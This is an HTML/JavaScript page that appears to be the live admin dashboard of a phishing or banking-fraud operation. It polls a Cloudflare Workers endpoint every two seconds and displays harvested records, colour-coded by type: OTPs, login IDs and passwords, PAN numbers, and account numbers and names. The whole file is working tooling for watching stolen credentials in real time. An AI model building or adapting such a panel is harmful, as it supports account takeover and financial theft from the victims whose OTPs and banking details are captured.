<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Admin Color-Coded</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        
        body { background-color: #ffffff; padding: 10px; text-align: left; }

        /* Small Header */
        .header {
            padding: 8px 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            margin-bottom: 10px;
        }
        .header h1 { font-size: 11px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
        
        .v-badge {
            background: #000;
            color: #fff;
            padding: 2px 10px;
            border-radius: 4px;
            font-weight: 800;
            font-size: 14px;
        }

        .container { display: flex; flex-direction: column; gap: 5px; }

        /* Compact Full Screen Cart */
        .data-row {
            display: block;
            width: 100%;
            padding: 6px 12px; /* Bahut patla padding */
            border-radius: 4px;
            font-size: 13px; /* Chota text */
            font-weight: 700;
            line-height: 1.3;
            color: #000000; /* Text Black */
            white-space: pre-wrap;
            text-align: left; /* Shuruat se */
            word-break: break-all;
            border: 1px solid rgba(0,0,0,0.03);
        }

        .time {
            display: block;
            font-size: 8px;
            color: rgba(0,0,0,0.3);
            margin-top: 2px;
            font-weight: 400;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>TERMINAL</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div class="container" id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    let content = log.detail.toLowerCase();
                    let bgColor = "#f0f0f0"; // Default Grey

                    // COLOR CODING LOGIC
                    if (content.includes("otp:-")) {
                        bgColor = "#ffcdd2"; // Red (OTP)
                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
                        bgColor = "#c8e6c9"; // Green (Login)
                    } else if (content.includes("pan:-")) {
                        bgColor = "#bbdefb"; // Blue (PAN)
                    } else if (content.includes("acc:-") || content.includes("name:-")) {
                        bgColor = "#f8bbd0"; // Pink (Account)
                    }

                    return `
                        <div class="data-row" style="background-color: ${bgColor};">
                            ${log.detail}
                            <span class="time">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Sync..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
